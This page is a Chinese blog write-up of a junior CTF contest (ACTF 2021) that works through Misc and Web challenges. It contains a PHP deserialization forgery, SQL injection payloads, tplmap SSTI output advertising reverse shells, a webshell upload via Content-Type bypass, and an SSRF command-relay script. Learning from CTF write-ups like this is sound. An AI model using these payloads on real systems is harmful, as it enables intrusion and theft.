@@ -1,0 +1,537 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+    
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    
+    <meta name="renderer" content="webkit"/>
+    <meta name="force-rendering" content="webkit"/>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    <script>if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMode)) window.location.href="https://support.dmeng.net/upgrade-your-browser.html?referrer="+encodeURIComponent(window.location.href); </script>
+    
+    
+        <link rel="preload" crossorigin="crossorigin" href="/fonts/roboto/Roboto-Regular.woff2" as="font">
+        <link rel="preload" crossorigin="crossorigin" href="/fonts/roboto/Roboto-Bold.woff2" as="font">
+    
+    
+    
+        <link rel="shortcut icon" href="/icons/favicon.ico">
+    
+
+    
+    
+        
+<link rel="stylesheet" href="/css/mdui.min.v1.0.0.css">
+
+    
+    
+<link rel="stylesheet" href="/css/main.css">
+<link rel="stylesheet" href="/css/iconfont.css">
+
+
+    
+    
+
+    
+        <script data-ad-client="ca-" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    
+
+
+
+
+
+
+
+
+
+
+
+
+          
+
+
+    
+    
+    <title>
+        
+            记录ACTF_Junior_2021的做题过程 | Hexo
+        
+    </title>
+    
+    
+<meta name="generator" content="Hexo 5.3.0"></head>
+<body class="mdui-drawer-body-left mdui-appbar-with-toolbar mdui-theme-primary-teal mdui-theme-accent-blue">
+  
+  <header class="mdui-appbar mdui-appbar-fixed">
+  <div id="toolbar" class="mdui-toolbar mdui-color-theme">
+    <button class="mdui-btn mdui-btn-icon" mdui-drawer="{target: '#sidebar', swipe: true}"><i class="iconfont icon-menu"></i></button>
+    <a href="/" class="mdui-typo-headline">Hexo</a>
+    <a href="/" class="header-subtitle mdui-typo-headline"></a>
+    <div class="mdui-toolbar-spacer"></div>
+    <button class="mdui-btn mdui-btn-icon" mdui-dialog="{target: '#search'}" mdui-tooltip="{content: 'search'}"><i class="iconfont icon-search"></i></button>
+  </div>
+</header>
+
+<div class="mdui-dialog" id="search">
+  
+    <div class="search-form">
+      <input type="search" class="search-form-input" placeholder="请输入关键字" onfocus="listenSearchFunc()">
+    </div>
+    <div class="search-result" data-resource="/search.xml"></div>
+  
+</div>
+
+  <aside id="sidebar" class="mdui-drawer">
+    <div class="mdui-tab" mdui-tab>
+        <a href="#sidebar-tab1" id="sidebartab" class="mdui-ripple mdui-tab-active">Overview</a>
+        <a href="#sidebar-tab2" id="sidebartab" class="mdui-ripple">About</a>
+    </div>
+
+    
+    <div id="sidebar-tab1" class="mdui-p-a-1">
+        <div class="mdui-list">
+            
+                
+                <a href="/" class="mdui-list-item mdui-ripple">
+                    <div class="mdui-list-item-icon">
+                        <i class="iconfont icon-home"></i>
+                    </div>
+                    <div class="mdui-list-item-content">Home</div>
+                </a>
+            
+                
+                <a href="/tags/" class="mdui-list-item mdui-ripple">
+                    <div class="mdui-list-item-icon">
+                        <i class="iconfont icon-bookmark"></i>
+                    </div>
+                    <div class="mdui-list-item-content">Tags</div>
+                </a>
+            
+                
+                <a href="/categories/" class="mdui-list-item mdui-ripple">
+                    <div class="mdui-list-item-icon">
+                        <i class="iconfont icon-folder"></i>
+                    </div>
+                    <div class="mdui-list-item-content">Categories</div>
+                </a>
+            
+                
+                <a href="/archives/" class="mdui-list-item mdui-ripple">
+                    <div class="mdui-list-item-icon">
+                        <i class="iconfont icon-archive"></i>
+                    </div>
+                    <div class="mdui-list-item-content">Archives</div>
+                </a>
+            
+                
+                <a href="/tools/" class="mdui-list-item mdui-ripple">
+                    <div class="mdui-list-item-icon">
+                        <i class="iconfont icon-tools"></i>
+                    </div>
+                    <div class="mdui-list-item-content">工具箱</div>
+                </a>
+            
+                
+                <a href="/about/" class="mdui-list-item mdui-ripple">
+                    <div class="mdui-list-item-icon">
+                        <i class="iconfont icon-user"></i>
+                    </div>
+                    <div class="mdui-list-item-content">About</div>
+                </a>
+            
+            <div class="mdui-list-item mdui-ripple">
+                <div class="mdui-list-item-icon">
+                    <i class="iconfont icon-moon"></i>
+                </div>
+                <div class="mdui-list-item-content">Night Mode</div>
+                <label class="mdui-switch" id="darkmode">
+                  <input type="checkbox" id="nightmode_switch"/>
+                  <i class="mdui-switch-icon"></i>
+                </label>
+            </div>           
+        </div>
+    </div>
+
+    
+    <div id="sidebar-tab2" class="mdui-p-a-1">
+        <div class="sidebar-overview">
+            <div class="sidebar-avatar">
+                
+                    <img src="/icons/avatar.gif"/>
+                
+            </div>
+            <div class="sidebar-author-name">John Doe</div>
+            <div class="sidebar-description"></div>
+        </div>
+        <div class="sidebar-links">
+            
+                
+                <div class="mdui-chip">
+                    <span class="mdui-chip-icon"><i class="iconfont icon-mail"></i></span>
+                    <a href="mailto:xxx@xxx.com" class="mdui-chip-title">E-Mail</a>
+                </div>
+            
+                
+                <div class="mdui-chip">
+                    <span class="mdui-chip-icon"><i class="iconfont icon-github"></i></span>
+                    <a target="_blank" rel="noopener" href="https://your.url" class="mdui-chip-title">GitHub</a>
+                </div>
+            
+                
+                <div class="mdui-chip">
+                    <span class="mdui-chip-icon"><i class="iconfont icon-steam"></i></span>
+                    <a target="_blank" rel="noopener" href="https://your.url" class="mdui-chip-title">Steam</a>
+                </div>
+            
+                
+                <div class="mdui-chip">
+                    <span class="mdui-chip-icon"><i class="iconfont icon-weibo"></i></span>
+                    <a target="_blank" rel="noopener" href="https://your.url" class="mdui-chip-title">Weibo</a>
+                </div>
+            
+        </div>
+        <ul class="mdui-list" mdui-collapse="{accordion: true}">
+            <li class="mdui-collapse-item">
+                <div class="mdui-collapse-item-header mdui-list-item mdui-ripple">
+                    <div class="mdui-list-item-icon">
+                        <i class="iconfont icon-link"></i>
+                    </div>
+                    <div class="mdui-list-item-content">Links</div>
+                    <div class="mdui-collapse-item-arrow">
+                        <i class="mdui-list-item-icon iconfont icon-angle-down"></i>
+                    </div>
+                </div>
+                <ul id="linksList" class="mdui-collapse-item-body mdui-list mdui-list-dense">
+                    
+                        <a target="_blank" rel="noopener" href="https://garybear.cn/hexo-theme-meadow/" class="mdui-list-item mdui-ripple">
+                            Meadow说明文档
+                        </a>
+                    
+                </ul>
+            </li>
+        </ul>
+    </div>
+
+    <div class="mdui-divider"></div>
+    
+    
+</aside>
+  
+  <main id="main-contain" class="mdui-container mdui-m-t-5">
+    <article id="article" class="mdui-card mdui-p-b-2 mdui-m-b-5">
+  <header class="mdui-card-media">
+    
+    
+      <div class="post-header"> 
+  <a class="post-header-title" href="/2021/02/22/%E8%AE%B0%E5%BD%95ACTF-Junior-2021%E7%9A%84%E5%81%9A%E9%A2%98%E8%BF%87%E7%A8%8B/">记录ACTF_Junior_2021的做题过程</a>
+  <div class="post-header-meta">
+    <span>
+      <span class="iconfont icon-calendar"></span>
+      Posted on:&nbsp;2021-02-22
+    </span>
+    <span>
+      <span class="iconfont icon-calendar-check"></span>
+      Edited on:&nbsp;2021-02-22
+    </span>
+    <span>
+      <span class="iconfont icon-folder"></span>
+      In:&nbsp;
+    </span>
+    
+      <span>
+        <span class="iconfont icon-eye"></span>
+        Views:&nbsp;
+        <span id="busuanzi_container_page_pv"><span id="busuanzi_value_page_pv"></span></span>
+      </span>
+    
+  </div>
+</div>   
+    
+
+
+
+    
+    
+    <div class="mdui-card-menu">
+    
+      <button class="mdui-btn mdui-btn-icon mdui-text-color-teal" mdui-menu="{target: '#share_menu', align: 'right'}"><i class="iconfont icon-share"></i></button>
+      <ul class="mdui-menu" id="share_menu">
+        <li class="mdui-menu-item">
+          <a href="http://service.weibo.com/share/share.php?appkey=&title=记录ACTF_Junior_2021的做题过程&url=http://example.com/2021/02/22/%E8%AE%B0%E5%BD%95ACTF-Junior-2021%E7%9A%84%E5%81%9A%E9%A2%98%E8%BF%87%E7%A8%8B/&pic=http://example.com/null&searchPic=false&style=simple" target="_blank" class="mdui-ripple">Share to Weibo</a>
+        </li>
+        <li class="mdui-menu-item">
+          <a href="https://twitter.com/intent/tweet?text=记录ACTF_Junior_2021的做题过程&url=http://example.com/2021/02/22/%E8%AE%B0%E5%BD%95ACTF-Junior-2021%E7%9A%84%E5%81%9A%E9%A2%98%E8%BF%87%E7%A8%8B/&via=John Doe" target="_blank" class="mdui-ripple">Share to Twitter</a>
+        </li>
+        <li class="mdui-menu-item">
+          <a href="https://www.facebook.com/sharer/sharer.php?u=http://example.com/2021/02/22/%E8%AE%B0%E5%BD%95ACTF-Junior-2021%E7%9A%84%E5%81%9A%E9%A2%98%E8%BF%87%E7%A8%8B/" target="_blank" class="mdui-ripple">Share to Facebook</a>
+        </li>
+        <li class="mdui-menu-item">
+          <a href="https://plus.google.com/share?url=http://example.com/2021/02/22/%E8%AE%B0%E5%BD%95ACTF-Junior-2021%E7%9A%84%E5%81%9A%E9%A2%98%E8%BF%87%E7%A8%8B/" target="_blank" class="mdui-ripple">Share to Google+</a>
+        </li>
+        <li class="mdui-menu-item">
+          <a href="https://www.linkedin.com/shareArticle?mini=true&url=http://example.com/2021/02/22/%E8%AE%B0%E5%BD%95ACTF-Junior-2021%E7%9A%84%E5%81%9A%E9%A2%98%E8%BF%87%E7%A8%8B/&title=记录ACTF_Junior_2021的做题过程" target="_blank" class="mdui-ripple">Share to LinkedIn</a>
+        </li>
+        <li class="mdui-menu-item">
+          <a href="http://connect.qq.com/widget/shareqq/index.html?site=Hexo&title=记录ACTF_Junior_2021的做题过程&summary=&pics=http://example.com/null&url=http://example.com/2021/02/22/%E8%AE%B0%E5%BD%95ACTF-Junior-2021%E7%9A%84%E5%81%9A%E9%A2%98%E8%BF%87%E7%A8%8B/" target="_blank" class="mdui-ripple">Share to QQ</a>
+        </li>
+        <li class="mdui-menu-item">
+          <a href="https://telegram.me/share/url?url=http://example.com/2021/02/22/%E8%AE%B0%E5%BD%95ACTF-Junior-2021%E7%9A%84%E5%81%9A%E9%A2%98%E8%BF%87%E7%A8%8B/&text=记录ACTF_Junior_2021的做题过程" target="_blank" class="mdui-ripple">Share to Telegram</a>
+        </li>
+      </ul>
+    
+  </div>
+  </header>
+  
+  
+  
+  
+  <div class="post-tags">
+    
+      <i class="iconfont icon-tag">
+        <a rel="tag" href = /tags/ctf/ >ctf</a>
+      </i>
+    
+  </div>
+
+  
+  <div class="mdui-card-content mdui-typo mdui-p-x-4">
+    <h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p><img src="F:\wp-Blog\source_posts\记录ACTF-Junior-2021的做题过程\image-20210222114219918.png" alt="sign"></p>
+<p>照抄flag</p>
+<h2 id="Real-way"><a href="#Real-way" class="headerlink" title="Real_way"></a>Real_way</h2><p>文件有点大，待续…</p>
+<h2 id="纳什均衡"><a href="#纳什均衡" class="headerlink" title="纳什均衡"></a>纳什均衡</h2><p>一道博弈论的题</p>
+<p><img src="F:\wp-Blog\source_posts\记录ACTF-Junior-2021的做题过程\image-20210222115559971.png" alt="image-20210222115559971"></p>
+<p>显然，如果n=m+1，那么由于一次最多只能取m个，所以，无论先取者拿走多少个，后取者都能够一次拿走剩余的物品，后者取胜。因此我们发现了如何取胜的法则：如果n=（m+1）r+s，（r为任意自然数，s≤m),那么先取者要拿走s个物品，如果后取者拿走k（≤m)个，那么先取者再拿走m+1-k个，结果剩下（m+1）（r-1）个，以后保持这样的取法，那么先取者肯定获胜。总之，要保持给对手留下（m+1）的倍数，就能最后获胜。</p>
+<p>即，若n=k*(m+1)，则后取着胜，反之，存在先取者获胜的取法。n%(m+1)==0. 先取者必败。</p>
+<p>我们为先手，所以要取s个，下面为代码（手算也可以）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;139.155.83.108&#x27;</span>,<span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;The minimum number is 1 and the maximum number is &#x27;</span>)</span><br><span class="line">m=<span class="built_in">int</span>(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>])</span><br><span class="line">print(<span class="string">&#x27;M:&#x27;</span>,m)</span><br><span class="line">r.recvuntil(<span class="string">&quot;You&#x27;re ready? (y/n)&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;Are you sure you want to abandon?(y/n)&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;The current number of pebbles : &#x27;</span>)</span><br><span class="line">    n=<span class="built_in">int</span>(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>])</span><br><span class="line">    print(<span class="string">&#x27;N:&#x27;</span>,n)</span><br><span class="line">    <span class="keyword">if</span> n%(m+<span class="number">1</span>)==<span class="number">0</span>:</span><br><span class="line">        r.close()</span><br><span class="line">        print(<span class="string">&quot;It&#x27;s impossible to win.&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> n&lt;=m:</span><br><span class="line">            s=<span class="built_in">str</span>(n)</span><br><span class="line">            r.sendline(s)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        s=<span class="built_in">str</span>(n%(m+<span class="number">1</span>))</span><br><span class="line">        print(s)</span><br><span class="line">        r.sendline(s)</span><br><span class="line">        r.recvuntil(<span class="string">&#x27;The current number of pebbles : &#x27;</span>)</span><br><span class="line">        n=<span class="built_in">int</span>(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="与熊论道"><a href="#与熊论道" class="headerlink" title="与熊论道"></a>与熊论道</h2><p>打开zip得到两个文件</p>
+<p><img src="F:\wp-Blog\source_posts\记录ACTF-Junior-2021的做题过程\image-20210222123220057.png" alt="image-20210222123220057"></p>
+<p>熊曰.txt内容拿去与熊论道解密再用社会主义核心价值观解密得到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwd:123456</span><br></pre></td></tr></table></figure>
+<p>用密码通过wbStego解密bmp得到flag</p>
+<h2 id="禁止摸鱼"><a href="#禁止摸鱼" class="headerlink" title="禁止摸鱼"></a>禁止摸鱼</h2><p>拿到jpg看到Exif字样</p>
+<p><img src="F:\wp-Blog\source_posts\记录ACTF-Junior-2021的做题过程\image-20210222123821691.png" alt="image-20210222123821691"></p>
+<p>看下属性发现没什么东西，拉到后面发现有个zip包，把它导出来，里面有两个文件</p>
+<p><img src="F:\wp-Blog\source_posts\记录ACTF-Junior-2021的做题过程\image-20210222124001897.png" alt="image-20210222124001897"></p>
+<p>hint提示用软件爆破得到密码（之前用低版本爆破不了，改了高版本可以用了）</p>
+<p><img src="F:\wp-Blog\source_posts\记录ACTF-Junior-2021的做题过程\image-20210222124321667.png" alt="image-20210222124321667"></p>
+<p>打开flag.txt文件base64解码得到flag</p>
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="baby-serialize"><a href="#baby-serialize" class="headerlink" title="baby_serialize"></a>baby_serialize</h2><p>把class拉出来把Username改成admin，再导出url编码的序列化字符串传入user参数得到flag</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Username</span> = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$Username</span> = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> User();</span><br><span class="line"><span class="variable">$a</span> = serialize(<span class="variable">$obj</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(<span class="variable">$a</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="Do-You-like-Python"><a href="#Do-You-like-Python" class="headerlink" title="Do_You_like_Python?"></a>Do_You_like_Python?</h2><p>有提示SSTI百度有攻击工具<strong>tplmap</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;epinna&#x2F;tplmap</span><br></pre></td></tr></table></figure>
+<p>扫一下发现可以获得shell，追加–so-shell获得shell，接下来自然是熟悉的一顿操作获取flag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">[root@xxx tplmap]<span class="comment"># ./tplmap.py -u &#x27;http://149.129.34.135:13335/login&#x27; -d &#x27;Username=*&#x27;--os-cmd</span></span><br><span class="line">[+] Tplmap 0.5</span><br><span class="line">    Automatic Server-Side Template Injection Detection and Exploitation Tool</span><br><span class="line"></span><br><span class="line">[+] Testing <span class="keyword">if</span> POST parameter <span class="string">&#x27;Username&#x27;</span> is injectable</span><br><span class="line">[+] Smarty plugin is testing rendering with tag <span class="string">&#x27;*&#x27;</span></span><br><span class="line">[+] Smarty plugin is testing blind injection</span><br><span class="line">[+] Mako plugin is testing rendering with tag <span class="string">&#x27;$&#123;*&#125;&#x27;</span></span><br><span class="line">[+] Mako plugin is testing blind injection</span><br><span class="line">[+] Python plugin is testing rendering with tag <span class="string">&#x27;str(*)&#x27;</span></span><br><span class="line">[+] Python plugin is testing blind injection</span><br><span class="line">[+] Tornado plugin is testing rendering with tag <span class="string">&#x27;&#123;&#123;*&#125;&#125;&#x27;</span></span><br><span class="line">[+] Tornado plugin is testing blind injection</span><br><span class="line">[+] Jinja2 plugin is testing rendering with tag <span class="string">&#x27;&#123;&#123;*&#125;&#125;&#x27;</span></span><br><span class="line">[+] Jinja2 plugin has confirmed injection with tag <span class="string">&#x27;&#123;&#123;*&#125;&#125;&#x27;</span></span><br><span class="line">[+] Tplmap identified the following injection point:</span><br><span class="line"></span><br><span class="line">  POST parameter: Username</span><br><span class="line">  Engine: Jinja2</span><br><span class="line">  Injection: &#123;&#123;*&#125;&#125;</span><br><span class="line">  Context: text</span><br><span class="line">  OS: posix-linux</span><br><span class="line">  Technique: render</span><br><span class="line">  Capabilities:</span><br><span class="line"></span><br><span class="line">   Shell <span class="built_in">command</span> execution: ok</span><br><span class="line">   Bind and reverse shell: ok</span><br><span class="line">   File write: ok</span><br><span class="line">   File <span class="built_in">read</span>: ok</span><br><span class="line">   Code evaluation: ok, python code</span><br><span class="line"></span><br><span class="line">[+] Rerun tplmap providing one of the following options:</span><br><span class="line"></span><br><span class="line">    --os-shell                          Run shell on the target</span><br><span class="line">    --os-cmd                            Execute shell commands</span><br><span class="line">    --bind-shell PORT                   Connect to a shell <span class="built_in">bind</span> to a target port</span><br><span class="line">    --reverse-shell HOST PORT   Send a shell back to the attacker<span class="string">&#x27;s port</span></span><br><span class="line"><span class="string">    --upload LOCAL REMOTE       Upload files to the server</span></span><br><span class="line"><span class="string">    --download REMOTE LOCAL     Download remote files</span></span><br></pre></td></tr></table></figure>
+<h2 id="easyeasySQL"><a href="#easyeasySQL" class="headerlink" title="easyeasySQL"></a>easyeasySQL</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#39; or 1&#x3D;1 order by 3#</span><br><span class="line">&#39; or 1&#x3D;1 order by 4#</span><br></pre></td></tr></table></figure>
+<p><img src="F:\wp-Blog\source_posts\记录ACTF-Junior-2021的做题过程\image-20210222131515196.png" alt="image-20210222131515196"></p>
+<p>发现字段数为3，再来熟悉的查表，查字段</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; or 1&#x3D;2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database()#</span><br></pre></td></tr></table></figure>
+<p><img src="F:\wp-Blog\source_posts\记录ACTF-Junior-2021的做题过程\image-20210222132440791.png" alt="image-20210222132440791"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;&#39;f1Ag&#39;#</span><br></pre></td></tr></table></figure>
+<p><img src="F:\wp-Blog\source_posts\记录ACTF-Junior-2021的做题过程\image-20210222132515696.png" alt="image-20210222132515696"></p>
+<p>最后就能拿到flag了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; union select 1,group_concat(flag),3 from f1Ag#</span><br></pre></td></tr></table></figure>
+<h2 id="想执行命令？"><a href="#想执行命令？" class="headerlink" title="想执行命令？"></a>想执行命令？</h2><p>查看根目录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls /&gt;1.txt</span><br></pre></td></tr></table></figure>
+<p><img src="F:\wp-Blog\source_posts\记录ACTF-Junior-2021的做题过程\image-20210222183034410.png" alt="image-20210222183034410"></p>
+<p>找到flag，直接</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /flag&gt;1.txt</span><br></pre></td></tr></table></figure>
+<h2 id="linkgame"><a href="#linkgame" class="headerlink" title="linkgame"></a>linkgame</h2><p>在ip前追加<code>view-source:</code>看源码得到flag</p>
+<h2 id="easyUpload"><a href="#easyUpload" class="headerlink" title="easyUpload"></a>easyUpload</h2><p>先上个🐴儿，竟然不给上</p>
+<p><img src="F:\wp-Blog\source_posts\记录ACTF-Junior-2021的做题过程\image-20210222150104784.png" alt="image-20210222150104784"></p>
+<p>Ctrl+U看下源码</p>
+<p><img src="F:\wp-Blog\source_posts\记录ACTF-Junior-2021的做题过程\image-20210222152157586.png" alt="image-20210222152157586"></p>
+<p>发现有个php，进去康康</p>
+<p><img src="F:\wp-Blog\source_posts\记录ACTF-Junior-2021的做题过程\image-20210222152301766.png" alt="image-20210222152301766"></p>
+<p>看了是识别了<strong>Content-Type：</strong>bp抓包改一下</p>
+<p><img src="F:\wp-Blog\source_posts\记录ACTF-Junior-2021的做题过程\image-20210222152651680.png" alt="image-20210222152651680"></p>
+<p><img src="F:\wp-Blog\source_posts\记录ACTF-Junior-2021的做题过程\image-20210222152731839.png" alt="image-20210222152731839"></p>
+<p>上传成功，看看我的🐴儿</p>
+<p><img src="F:\wp-Blog\source_posts\记录ACTF-Junior-2021的做题过程\image-20210222152907118.png" alt="image-20210222152907118"></p>
+<p>成功链接，后面还是熟悉的操作</p>
+<h2 id="easyXSS"><a href="#easyXSS" class="headerlink" title="easyXSS"></a>easyXSS</h2><p>有点烦，获取不到cookie，待续</p>
+<h2 id="easySSRF"><a href="#easySSRF" class="headerlink" title="easySSRF"></a>easySSRF</h2><p><img src="F:\wp-Blog\source_posts\记录ACTF-Junior-2021的做题过程\image-20210222180417663.png" alt="image-20210222180417663"></p>
+<p>进去提示flag在内网的某个主机里，并且提供curl服务，先进去康康</p>
+<p><img src="F:\wp-Blog\source_posts\记录ACTF-Junior-2021的做题过程\image-20210222180453719.png" alt="image-20210222180453719"></p>
+<p>传入的a会被当成函数名执行，b为参数，利用system执行命令写个shell</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">u1=<span class="string">&quot;http://101.37.32.116:20213/?url=&quot;</span></span><br><span class="line">u2=<span class="string">&#x27;http://192.168.54.3/?a=system&amp;b=&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    cmd=<span class="built_in">input</span>(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    cmd=cmd.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;$&#123;IFS&#125;&#x27;</span>)</span><br><span class="line">    u=u1+quote(u2+cmd)</span><br><span class="line">    r=requests.get(u)</span><br><span class="line">    text=r.text.split(<span class="string">&quot;&lt;/code&gt;&quot;</span>)[-<span class="number">1</span>]</span><br><span class="line">    print(text)</span><br></pre></td></tr></table></figure>
+<p>在这里url是参数，所以要url编码，此外传入空格会显示404，所以用<code>$&#123;IFS&#125;</code>代替</p>
+<p><img src="F:\wp-Blog\source_posts\记录ACTF-Junior-2021的做题过程\image-20210222180954894.png" alt="image-20210222180954894"></p>
+<p>成功运行</p>
+<h2 id="esay-look"><a href="#esay-look" class="headerlink" title="esay_look"></a>esay_look</h2><p><img src="F:\wp-Blog\source_posts\记录ACTF-Junior-2021的做题过程\image-20210222153641088.png" alt="image-20210222153641088"></p>
+<p><code>and</code>的优先级比<code>=</code>低，所以<code>$a=1</code>就行了，后面md5检测还是利用php将0e开头的字符串转换为0的漏洞，写脚本挂服务器爆破</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5_enc</span>(<span class="params">s</span>):</span></span><br><span class="line">    m=hashlib.md5()</span><br><span class="line">    m.update(s.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> m.hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">999999999</span>):</span><br><span class="line">    i=<span class="string">&#x27;0e&#x27;</span>+<span class="built_in">str</span>(i)</span><br><span class="line">    enc=md5_enc(i)</span><br><span class="line">    <span class="keyword">if</span> enc[:<span class="number">2</span>]==<span class="string">&#x27;0e&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> enc[<span class="number">2</span>:].isdigit():</span><br><span class="line">            print(i,enc)</span><br></pre></td></tr></table></figure>
